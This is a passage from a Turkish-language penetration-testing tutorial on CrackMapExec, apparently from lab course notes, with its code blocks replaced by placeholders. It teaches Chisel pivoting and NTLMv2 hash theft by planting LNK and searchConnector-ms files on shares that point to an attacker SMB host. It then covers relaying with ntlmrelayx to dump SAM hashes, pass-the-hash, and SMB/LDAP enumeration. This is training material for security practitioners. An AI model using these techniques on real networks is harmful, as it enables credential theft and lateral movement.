Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
